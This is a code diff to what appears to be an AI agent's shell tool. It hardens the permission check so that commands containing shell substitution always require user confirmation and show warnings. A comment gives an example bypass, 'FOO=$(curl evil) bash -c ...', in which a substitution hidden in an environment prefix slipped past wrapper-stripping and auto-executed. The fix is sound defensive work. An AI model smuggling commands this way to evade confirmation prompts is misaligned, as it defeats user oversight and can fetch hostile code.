@@ -43,9 +43,11 @@ import { formatMemoryUsage } from '../utils/formatters.js';
 import type { AnsiOutput } from '../utils/terminalSerializer.js';
 import { isSubpaths } from '../utils/paths.js';
 import {
+  buildShellExecWarnings,
   getCommandRoot,
   getCommandRoots,
   getShellConfiguration,
+  hasShellSubstitution,
   type ShellConfiguration,
   type ShellType,
   splitCommands,
@@ -1376,10 +1378,23 @@ export class ShellToolInvocation extends BaseToolInvocation<
 
   /**
    * AST-based permission check for the shell command.
+   * - Substitution-bearing commands (any form, including inside an
+   *   env-prefix wrapper that `stripShellWrapper` would discard) → 'ask'
    * - Read-only commands (via AST analysis) → 'allow'
    * - All other commands → 'ask'
    */
   override async getDefaultPermission(): Promise<PermissionDecision> {
+    // Gate on the RAW command before `stripShellWrapper` runs.
+    // `stripShellWrapper` drops leading env-assignment tokens AND
+    // unwraps `bash -c '...'` to its inner script — so for
+    // `FOO=$(curl evil) bash -c 'echo ok'` the stripped form is just
+    // `echo ok`, which the AST classifies as read-only. Without this
+    // gate the command auto-executes silently with no confirmation
+    // dialog and no warning. See PR #4386 R6 (cid 3298521039).
+    if (hasShellSubstitution(this.params.command)) {
+      return 'ask';
+    }
+
     const command = stripShellWrapper(this.params.command);
 
     // AST-based read-only detection
@@ -1463,6 +1478,15 @@ export class ShellToolInvocation extends BaseToolInvocation<
       debugLogger.warn('Failed to extract command rules:', e);
     }
 
+    // Flag command substitution ($(), backticks, <(), >()) so the user
+    // sees a visible warning in the confirmation dialog. We surface this
+    // as an informational warning rather than denying outright; the deny
+    // path was inconsistent and could not be overridden by YOLO mode
+    // (see issue #4093). Substitution is detected on both the stripped
+    // and original command so wrappers like `bash -c "..."` are checked
+    // along with their inner contents.
+    const warnings = buildShellExecWarnings(command, this.params.command);
+
     const confirmationDetails: ToolExecuteConfirmationDetails = {
       type: 'exec',
       title: 'Confirm Shell Command',
@@ -1476,6 +1500,9 @@ export class ShellToolInvocation extends BaseToolInvocation<
         // No-op: persistence is handled by coreToolScheduler via PM rules
       },
     };
+    if (warnings) {
+      confirmationDetails.warnings = warnings;
+    }
     return confirmationDetails;
   }
 
